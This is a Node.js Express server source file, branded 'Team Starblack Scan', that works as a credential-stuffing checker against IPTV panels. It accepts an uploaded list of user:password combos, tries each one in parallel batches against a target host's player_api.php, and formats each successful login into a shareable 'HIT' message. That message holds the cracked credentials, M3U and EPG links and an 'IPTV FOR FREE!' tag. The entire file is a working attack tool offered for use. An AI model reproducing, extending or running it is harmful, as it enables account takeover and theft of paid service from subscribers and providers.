const express = require('express');
const multer = require('multer');
const cors = require('cors');
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

const upload = multer({ 
    storage: multer.memoryStorage(),
    limits: { fileSize: 10 * 1024 * 1024 }
});

// Mapeo de timezone a código de país
const timezoneToCountryCode = {
    "Europe/Andorra":"AD", "Asia/Dubai":"AE", "Asia/Kabul":"AF", "America/Antigua":"AG",
    "America/Anguilla":"AI", "Europe/Tirane":"AL", "Asia/Yerevan":"AM", "Africa/Luanda":"AO",
    "Antarctica/McMurdo":"AQ", "America/Argentina/Buenos_Aires":"AR", "Pacific/Pago_Pago":"AS",
    "Europe/Vienna":"AT", "Australia/Sydney":"AU", "America/Aruba":"AW", "Europe/Mariehamn":"AX",
    "Asia/Baku":"AZ", "Europe/Sarajevo":"BA", "America/Barbados":"BB", "Asia/Dhaka":"BD",
    "Europe/Brussels":"BE", "Africa/Ouagadougou":"BF", "Europe/Sofia":"BG", "Asia/Bahrain":"BH",
    "Africa/Bujumbura":"BI", "Africa/Porto-Novo":"BJ", "America/St_Barthelmy":"BL",
    "Atlantic/Bermuda":"BM", "Asia/Brunei":"BN", "America/La_Paz":"BO", "America/Noronha":"BR",
    "America/Nassau":"BS", "Asia/Thimphu":"BT", "Africa/Gaborone":"BW", "Europe/Minsk":"BY",
    "America/Belize":"BZ", "America/Toronto":"CA", "Indian/Cocos":"CC", "Africa/Kinshasa":"CD",
    "Africa/Bangui":"CF", "Africa/Brazzaville":"CG", "Europe/Zurich":"CH", "Africa/Abidjan":"CI",
    "Pacific/Rarotonga":"CK", "America/Santiago":"CL", "Africa/Douala":"CM", "Asia/Shanghai":"CN",
    "America/Bogota":"CO", "America/Costa_Rica":"CR", "America/Havana":"CU", "Atlantic/Cape_Verde":"CV",
    "America/Curacao":"CW", "Indian/Christmas":"CX", "Asia/Nicosia":"CY", "Europe/Prague":"CZ",
    "Europe/Berlin":"DE", "Africa/Djibouti":"DJ", "Europe/Copenhagen":"DK", "America/Dominica":"DM",
    "America/Santo_Domingo":"DO", "Africa/Algiers":"DZ", "America/Guayaquil":"EC", "Europe/Tallinn":"EE",
    "Africa/Cairo":"EG", "Africa/Asmara":"ER", "Europe/Madrid":"ES", "Africa/Addis_Abeba":"ET",
    "Europe/Helsinki":"FI", "Pacific/Fiji":"FJ", "Atlantic/Stanley":"FK", "Pacific/Chuuk":"FM",
    "Atlantic/Faroe":"FO", "Europe/Paris":"FR", "Africa/Libreville":"GA", "Europe/London":"GB",
    "America/Grenada":"GD", "Asia/Tbilisi":"GE", "America/Cayenne":"GF", "Europe/Guernsey":"GG",
    "Africa/Accra":"GH", "Europe/Gibraltar":"GI", "America/Godthab":"GL", "Africa/Banjul":"GM",
    "Africa/Conakry":"GN", "America/Guadeloupe":"GP", "Africa/Malabo":"GQ", "Europe/Athens":"GR",
    "Atlantic/South_Georgia":"GS", "America/Guatemala":"GT", "Pacific/Guam":"GU", "Africa/Bissau":"GW",
    "America/Guyana":"GY", "Asia/Hong_Kong":"HK", "America/Tegucigalpa":"HN", "Europe/Zagreb":"HR",
    "America/Port-au-Prince":"HT", "Europe/Budapest":"HU", "Asia/Jakarta":"ID", "Europe/Dublin":"IE",
    "Asia/Jerusalem":"IL", "Europe/Isle_of_Man":"IM", "Asia/Kolkata":"IN", "Indian/Chagos":"IO",
    "Asia/Baghdad":"IQ", "Asia/Tehran":"IR", "Atlantic/Reykjavik":"IS", "Europe/Rome":"IT",
    "Europe/Jersey":"JE", "America/Jamaica":"JM", "Asia/Amman":"JO", "Asia/Tokyo":"JP",
    "Africa/Nairobi":"KE", "Asia/Bishkek":"KG", "Asia/Phnom_Penh":"KH", "Pacific/Tarawa":"KI",
    "Indian/Comoro":"KM", "America/St_Kitts":"KN", "Asia/Pyongyang":"KP", "Asia/Seoul":"KR",
    "Asia/Kuwait":"KW", "America/Cayman":"KY", "Asia/Almaty":"KZ", "Asia/Vientiane":"LA",
    "Asia/Beirut":"LB", "America/St_Lucia":"LC", "Europe/Vaduz":"LI", "Asia/Colombo":"LK",
    "Africa/Monrovia":"LR", "Africa/Maseru":"LS", "Europe/Vilnius":"LT", "Europe/Luxembourg":"LU",
    "Europe/Riga":"LV", "Africa/Tripoli":"LY", "Africa/Casablanca":"MA", "Europe/Monaco":"MC",
    "Europe/Chisinau":"MD", "Europe/Podgorica":"ME", "America/Marigot":"MF", "Indian/Antananarivo":"MG",
    "Pacific/Majuro":"MH", "Europe/Skopje":"MK", "Africa/Bamako":"ML", "Asia/Yangon":"MM",
    "Asia/Ulaanbaatar":"MN", "Asia/Macau":"MO", "Pacific/Saipan":"MP", "America/Martinique":"MQ",
    "Africa/Nouakchott":"MR", "America/Montserrat":"MS", "Europe/Malta":"MT", "Indian/Mauritius":"MU",
    "Indian/Maldives":"MV", "Africa/Blantyre":"MW", "America/Mexico_City":"MX", "Asia/Kuala_Lur":"MY",
    "Africa/Maputo":"MZ", "Africa/Windhoek":"NA", "Pacific/Noumea":"NC", "Africa/Niamey":"NE",
    "Pacific/Norfolk":"NF", "Africa/Lagos":"NG", "America/Managua":"NI", "Europe/Amsterdam":"NL",
    "Europe/Oslo":"NO", "Asia/Kathmandu":"NP", "Pacific/Nauru":"NR", "Pacific/Niue":"NU",
    "Pacific/Auckland":"NZ", "Asia/Muscat":"OM", "America/Panama":"PA", "America/Lima":"PE",
    "Pacific/Tahiti":"PF", "Pacific/Port_Moresby":"PG", "Asia/Manila":"PH", "Asia/Karachi":"PK",
    "Europe/Warsaw":"PL", "America/Miquelon":"PM", "Pacific/Pitcairn":"PN", "America/Puerto_Rico":"PR",
    "Asia/Gaza":"PS", "Europe/Lisbon":"PT", "Pacific/Palau":"PW", "America/Asuncion":"PY",
    "Asia/Qatar":"QA", "Indian/Reunion":"RE", "Europe/Bucharest":"RO", "Europe/Belgrade":"RS",
    "Europe/Moscow":"RU", "Africa/Kigali":"RW", "Asia/Riyadh":"SA", "Pacific/Guadalcanal":"SB",
    "Indian/Mahe":"SC", "Africa/Khartoum":"SD", "Europe/Stockholm":"SE", "Asia/Singapore":"SG",
    "Atlantic/St_Helena":"SH", "Europe/Ljubljana":"SI", "Arctic/Longyearbyen":"SJ", "Europe/Bratislava":"SK",
    "Africa/Freetown":"SL", "Europe/San_Marino":"SM", "Africa/Dakar":"SN", "Africa/Mogadishu":"SO",
    "America/Paramaribo":"SR", "Africa/Juba":"SS", "Africa/Sao_Tome":"ST", "America/El_Salvador":"SV",
    "America/Lower_Princes":"SX", "Asia/Damascus":"SY", "Africa/Mbabane":"SZ", "America/Grand_Turk":"TC",
    "Africa/Ndjamena":"TD", "Indian/Kerguelen":"TF", "Africa/Lome":"TG", "Asia/Bangkok":"TH",
    "Asia/Dushanbe":"TJ", "Pacific/Fakaofo":"TK", "Asia/Dili":"TL", "Asia/Ashgabat":"TM",
    "Africa/Tunis":"TN", "Pacific/Tongatapu":"TO", "Europe/Istanbul":"TR", "America/Port_of_Spain":"TT",
    "Pacific/Funafuti":"TV", "Asia/Taipei":"TW", "Africa/Dar_es_Salaam":"TZ", "Europe/Kiev":"UA",
    "Africa/Kampala":"UG", "America/New_York":"US", "America/Montevideo":"UY", "Asia/Tashkent":"UZ",
    "Europe/Vatican":"VA", "America/St_Vincent":"VC", "America/Caracas":"VE", "America/Tortola":"VG",
    "America/St_Thomas":"VI", "Asia/Ho_Chi_Minh":"VN", "Pacific/Efate":"VU", "Pacific/Wallis":"WF",
    "Pacific/Apia":"WS", "Asia/Aden":"YE", "Indian/Mayotte":"YT", "Africa/Johannesburg":"ZA",
    "Africa/Lusaka":"ZM", "Africa/Harare":"ZW"
};

function getFlagFromTimezone(timezone) {
    if (!timezone) return { flag: "❓", code: "N/A" };
    const countryCode = timezoneToCountryCode[timezone];
    if (!countryCode) return { flag: "❓", code: "N/A" };
    const flag = countryCode.toUpperCase().split("").map(char => 
        String.fromCodePoint(char.charCodeAt(0) + 127397)).join("");
    return { flag, code: countryCode };
}

function limparHost(host) {
    return host.replace(/^https?:\/\//i, "").trim();
}

async function fetchComTimeout(resource, options = {}) {
    const { timeout = 10000 } = options;
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeout);
    try {
        const response = await fetch(resource, { ...options, signal: controller.signal });
        clearTimeout(id);
        return response;
    } catch (e) {
        clearTimeout(id);
        throw e;
    }
}

function formatCreatedDate(unix) {
    if (!unix || isNaN(unix) || unix == 0) return 'None';
    const d = new Date(unix * 1000);
    const day = ('0' + d.getDate()).slice(-2);
    const month = ('0' + (d.getMonth() + 1)).slice(-2);
    const year = d.getFullYear();
    return `${day}.${month}.${year}`;
}

async function getGeoLocation(hostOrIp) {
    try {
        const response = await fetchComTimeout(`http://ip-api.com/json/${hostOrIp}?fields=status,country,countryCode,city`);
        const data = await response.json();
        if (data.status === 'success') {
            return data;
        }
        return { country: 'N/A', city: 'N/A', countryCode: 'N/A' };
    } catch (e) {
        return { country: 'N/A', city: 'N/A', countryCode: 'N/A' };
    }
}

async function getRealUserData(host, user, pass, printCategories) {
    const baseUrl = `http://${host}/player_api.php?username=${user}&password=${pass}`;
    try {
        console.log(`Probando: ${user}:${pass} en ${host}`);
        
        const response = await fetchComTimeout(baseUrl);
        if (!response.ok) {
            console.log(`Respuesta no OK: ${response.status}`);
            return null;
        }
        
        const userInfo = await response.json();
        
        if (!userInfo.user_info || userInfo.user_info.auth !== 1) {
            console.log(`Auth falló para ${user}`);
            return null;
        }
        
        console.log(`✅ HIT encontrado: ${user}`);
        
        let live_categories = [];
        let vod_categories = [];
        let series_categories = [];
        
        if (printCategories === true || printCategories === 'true') {
            try {
                const liveCatRes = await fetchComTimeout(`${baseUrl}&action=get_live_categories`);
                if (liveCatRes.ok) live_categories = await liveCatRes.json();
            } catch(e) { console.log('Error obteniendo categorías live'); }
            
            try {
                const vodCatRes = await fetchComTimeout(`${baseUrl}&action=get_vod_categories`);
                if (vodCatRes.ok) vod_categories = await vodCatRes.json();
            } catch(e) { console.log('Error obteniendo categorías vod'); }
            
            try {
                const seriesCatRes = await fetchComTimeout(`${baseUrl}&action=get_series_categories`);
                if (seriesCatRes.ok) series_categories = await seriesCatRes.json();
            } catch(e) { console.log('Error obteniendo categorías series'); }
        }
        
        let live_streams_count = userInfo.user_info.live_streams_count || 0;
        let vod_streams_count = userInfo.user_info.vod_streams_count || 0;
        let series_count = userInfo.user_info.series_count || 0;
        
        if (live_streams_count === 0) {
            try {
                const liveRes = await fetchComTimeout(`${baseUrl}&action=get_live_streams`);
                if (liveRes.ok) {
                    const liveData = await liveRes.json();
                    live_streams_count = Array.isArray(liveData) ? liveData.length : 0;
                }
            } catch(e) {}
        }
        
        if (vod_streams_count === 0) {
            try {
                const vodRes = await fetchComTimeout(`${baseUrl}&action=get_vod_streams`);
                if (vodRes.ok) {
                    const vodData = await vodRes.json();
                    vod_streams_count = Array.isArray(vodData) ? vodData.length : 0;
                }
            } catch(e) {}
        }
        
        if (series_count === 0) {
            try {
                const seriesRes = await fetchComTimeout(`${baseUrl}&action=get_series`);
                if (seriesRes.ok) {
                    const seriesData = await seriesRes.json();
                    series_count = Array.isArray(seriesData) ? seriesData.length : 0;
                }
            } catch(e) {}
        }
        
        return {
            ...userInfo.user_info,
            server_info: userInfo.server_info,
            timezone: userInfo.server_info?.timezone,
            live_streams_count: live_streams_count,
            vod_streams_count: vod_streams_count,
            series_count: series_count,
            live_categories: live_categories,
            vod_categories: vod_categories,
            series_categories: series_categories,
        };
        
    } catch (error) {
        console.log(`Error para ${user}:`, error.message);
        return null;
    }
}

function formatarHit(info, host, user, pass, nick, emojis, config, geoLocation) {
    let timezoneText;
    if (!info.timezone || info.timezone.toUpperCase() === 'UTC') {
        timezoneText = `UTC 🏴‍☠️`;
    } else {
        const { flag, code } = getFlagFromTimezone(info.timezone);
        timezoneText = `${info.timezone} ${flag} [${code}]`;
    }

    let locationText = 'N/A';
    if (geoLocation && geoLocation.countryCode && geoLocation.countryCode !== 'N/A') {
        const flag = geoLocation.countryCode.toUpperCase().split('').map(char => 
            String.fromCodePoint(char.charCodeAt(0) + 127397)).join('');
        locationText = `${geoLocation.country}/${geoLocation.city} ${flag} [${geoLocation.countryCode}]`;
    }

    const messageText = info.message && info.message.trim() !== '' ? info.message : 'IPTV FOR FREE!';
    const realServerUrl = info.server_info ? `http://${info.server_info.url}:${info.server_info.port}` : `http://${host}`;
    
    let endsLine = '';
    let durationLine = '';

    if (!info.exp_date || isNaN(info.exp_date) || info.exp_date == 0) {
        endsLine = `${emojis.expira} E𝙽𝙳𝚂 ➠ «[🤴UNLIMITED🤴]»`;
    } else {
        const formattedEndDate = new Date(info.exp_date * 1000).toLocaleDateString('es-ES', {
            day: 'numeric',
            month: 'long',
            year: 'numeric'
        });
        endsLine = `${emojis.expira} E𝙽𝙳𝚂 ➠ ${formattedEndDate}`;

        const now = new Date();
        const expiryDate = new Date(info.exp_date * 1000);
        const diffTime = expiryDate - now;
        const daysLeft = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
        durationLine = `\n${emojis.emojiDuration} D𝚄𝚁𝙰𝚃𝙸𝙾𝙽 ➠ ${Math.max(0, daysLeft)} [D𝙰𝚈𝚂]`;
    }

    let categoryText = "";
    if (config.printCategories === true || config.printCategories === 'true') {
        const formatCategoryList = (titleEmoji, title, list, separator, notFoundMsg) => {
            const cleanSeparator = separator ? separator.trim() : '«[📺]»';
            if (!list || list.length === 0) {
                return `\n${titleEmoji} ${title}\n${cleanSeparator} ${notFoundMsg} ${cleanSeparator}`;
            }
            const names = list.map(c => c.category_name ? c.category_name.toUpperCase() : 'UNKNOWN').join(` ${cleanSeparator} `);
            return `\n${titleEmoji} ${title}\n${cleanSeparator} ${names} ${cleanSeparator}`;
        };
        categoryText += `\n━━━━━━━━━━━━━━━━━━━━` + formatCategoryList(emojis.emojiChannels, "𝐂𝐀𝐍𝐀𝐋 ➠ ", info.live_categories, config.channelSeparator, "NO CHANNELS FOUND");
        categoryText += `\n━━━━━━━━━━━━━━━━━━━━` + formatCategoryList(emojis.emojiMovies, "𝐌𝐎𝐕𝐈𝐄𝐒 ➠ ", info.vod_categories, config.movieSeparator, "NO MOVIES FOUND");
        categoryText += `\n━━━━━━━━━━━━━━━━━━━━` + formatCategoryList(emojis.emojiSeries, "𝐒𝐄𝐑𝐈𝐄𝐒 ➠ ", info.series_categories, config.seriesSeparator, "NO SERIES FOUND");
    } else {
        const cleanChannelSep = config.channelSeparator ? config.channelSeparator.trim() : '«[📺]»';
        const cleanMovieSep = config.movieSeparator ? config.movieSeparator.trim() : '«[🎬]»';
        const cleanSeriesSep = config.seriesSeparator ? config.seriesSeparator.trim() : '«[📺]»';
        categoryText = `\n━━━━━━━━━━━━━━━━━━━━\n${emojis.emojiChannels} 𝐂𝐀𝐍𝐀𝐋 ➠ \n${cleanChannelSep} H I D D E N ${cleanChannelSep}\n━━━━━━━━━━━━━━━━━━━━\n${emojis.emojiMovies} 𝐌𝐎𝐕𝐈𝐄𝐒 ➠ \n${cleanMovieSep} H I D D E N ${cleanMovieSep}\n━━━━━━━━━━━━━━━━━━━━\n${emojis.emojiSeries} 𝐒𝐄𝐑𝐈𝐄𝐒 ➠ \n${cleanSeriesSep} H I D D E N ${cleanSeriesSep}`;
    }
    
    const now = new Date();
    const dateString = now.toLocaleDateString('es-ES', { day: 'numeric', month: 'long', year: 'numeric' });
    const timeString = now.toTimeString().slice(0, 5);
    const footer = `\n━━━━━━━━━━━━━━━━━━━━\n📆 D𝙰𝚃𝙴 ➠ ${dateString}\n⏰️ T𝙸𝙼𝙴 ➠ ${timeString}\n⌨️ B𝚈 ➠ ${nick}\n👀 GRUPO ➠ Team Starblack\n${config.emojiCanal || '📬'} VISITA EL CANAL (${config.canalLink || "https://whatsapp.com/channel/0029VaAMgko05MUW81inJV04"})\n━━━━━━━━━━━━━━━━━━━━\nTeam Starblack 𝚂𝙲𝙰𝙽\n━━━━━━━━━━━━━━━━━━━━`;

    let texto = 
`━━━━━━━━━━━━━━━━━━━━
[${emojis.emojiHeader}] Team Starblack Scan [${emojis.emojiHeader}]
━━━━━━━━━━━━━━━━━━━━
${emojis.servidor} H𝙾𝚂𝚃 ➠ http://${host}
${emojis.emojiRealServer} R𝙴𝙰𝙻 ➠ ${realServerUrl}
${emojis.emojiProtocol} P𝚁𝙾𝚃𝙾𝙲𝙾𝙻 ➠ http
${emojis.emojiLocation} UBICACIÓN ➠ ${locationText}
${emojis.criada} C𝚁𝙴𝙰𝙳A ➠ ${formatCreatedDate(info.created_at)}
${endsLine}${durationLine}
${emojis.usuario} USUARIO ➠ ${user}
${emojis.senha} CONTRASEÑA ➠ ${pass}
${emojis.emojiTrial} T𝚁𝙸𝙰𝙻 ➠ [${info.is_trial == 1 ? "YES" : "NO"}]
${emojis.status} ESTADO ➠ ${info.status ? info.status.toUpperCase() : "ACTIVE"}
${emojis.conexoes} MAXIMA CONEXIONES ➠ [${info.max_connections || "N/A"}]
${emojis.conectados} CONEXIONES ACTIVAS ➠ [${info.active_cons || "0"}]
${emojis.emojiTimezone} ZONA HORARIA ➠ ${timezoneText}
${emojis.emojiMessage} MENSAJE ➠ ${messageText}
${emojis.hitsPor} H𝙸𝚃𝚂 B𝚈 ➠ ${nick}
━━━━━━━━━━━━━━━━━━━━
${emojis.linkM3U} H𝙾𝚂𝚃 M𝟹𝚄 ➠ http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus
${emojis.emojiRealM3U} R𝙴𝙰𝙻 M𝟹𝚄 ➠ ${realServerUrl}/get.php?username=${user}&password=${pass}&type=m3u_plus
${emojis.emojiEpgLink} E𝙿𝙶 L𝙸𝙽𝙺 ➠ http://${host}/xmltv.php?username=${user}&password=${pass}
━━━━━━━━━━━━━━━━━━━━
${emojis.emojiChannels} T𝙾𝚃𝙰𝙻 CANALES ➠ [${info.live_streams_count || 0}]
${emojis.emojiMovies} T𝙾𝚃𝙰𝙻 PELICULAS ➠ [${info.vod_streams_count || 0}]
${emojis.emojiSeries} T𝙾𝚃𝙰𝙻 S𝙴𝚁𝙸𝙴𝚂 ➠ [${info.series_count || 0}]` +
categoryText +
footer;

    return texto;
}

// Endpoint principal
app.post('/api/scan', upload.single('comboFile'), async (req, res) => {
    console.log('=== NUEVO ESCANEO INICIADO ===');
    
    try {
        const { host, nick, numBots, printCategories, channelSeparator, movieSeparator, seriesSeparator, canalLink, emojiCanal, emojis: emojisJson } = req.body;
        
        if (!host) {
            return res.status(400).json({ success: false, error: 'Host es requerido' });
        }
        
        if (!req.file) {
            return res.status(400).json({ success: false, error: 'Archivo de combos es requerido' });
        }
        
        const comboText = req.file.buffer.toString('utf-8');
        const combos = comboText.split(/\r?\n/).filter(l => l.includes(':') && l.trim().length > 0);
        
        if (combos.length === 0) {
            return res.status(400).json({ success: false, error: 'No se encontraron combos válidos en el archivo' });
        }
        
        console.log(`Host: ${host}`);
        console.log(`Combos a probar: ${combos.length}`);
        console.log(`Bots: ${numBots}`);
        console.log(`Mostrar categorías: ${printCategories}`);
        
        const bots = parseInt(numBots) || 20;
        let emojis;
        
        try {
            emojis = JSON.parse(emojisJson);
        } catch(e) {
            // Emojis por defecto si falla el parseo
            emojis = {
                emojiHeader: '★', hitsPor: '🎯', servidor: '🌐', usuario: '🤴',
                senha: '🔐', criada: '🗓️', expira: '📆', status: '🔋',
                emojiTrial: '⏲️', conectados: '👪', conexoes: '🧮',
                emojiTimezone: '🕰️', linkM3U: '🔗', emojiEpgLink: '📑',
                emojiMessage: '✍️', emojiChannels: '📺', emojiMovies: '🎬',
                emojiSeries: '🎞️', emojiRealServer: '📡', emojiRealM3U: '⛓️',
                emojiLocation: '🌍', emojiProtocol: '📖', emojiDuration: '⏳'
            };
        }
        
        const config = {
            printCategories: printCategories === 'true',
            channelSeparator: channelSeparator || '«[⚽️]»',
            movieSeparator: movieSeparator || '«[🍿]»',
            seriesSeparator: seriesSeparator || '«[📹]»',
            canalLink: canalLink || '',
            emojiCanal: emojiCanal || '📬'
        };
        
        const hits = [];
        let hitsCount = 0;
        let invalidosCount = 0;
        let testadosCount = 0;
        
        // Función para procesar un combo
        async function processCombo(combo) {
            const parts = combo.split(/:(.*)/s);
            const user = parts[0];
            const pass = parts[1];
            
            if (!user || !pass) {
                invalidosCount++;
                testadosCount++;
                return null;
            }
            
            const realInfo = await getRealUserData(host, user, pass, config.printCategories);
            
            if (realInfo) {
                const geoLocation = await getGeoLocation(realInfo.server_info?.url || host);
                hitsCount++;
                const hitFormatado = formatarHit(realInfo, host, user, pass, nick, emojis, config, geoLocation);
                hits.push(hitFormatado);
                testadosCount++;
                return { hit: hitFormatado, success: true };
            } else {
                invalidosCount++;
                testadosCount++;
                return null;
            }
        }
        
        // Procesar en lotes para no sobrecargar
        for (let i = 0; i < combos.length; i += bots) {
            const chunk = combos.slice(i, i + bots);
            console.log(`Procesando lote ${Math.floor(i/bots) + 1}/${Math.ceil(combos.length/bots)} (${chunk.length} combos)`);
            await Promise.all(chunk.map(combo => processCombo(combo)));
        }
        
        console.log(`Escaneo completado. Hits: ${hitsCount}, Bad: ${invalidosCount}, Total: ${testadosCount}`);
        
        res.json({
            success: true,
            hits: hits,
            stats: {
                total: combos.length,
                hits: hitsCount,
                invalidos: invalidosCount,
                testados: testadosCount
            }
        });
        
    } catch (error) {
        console.error('Error en scan:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

app.listen(port, () => {
    console.log(`✅ Servidor Team Starblack corriendo en puerto ${port}`);
    console.log(`📡 Accede en http://localhost:${port}`);
});
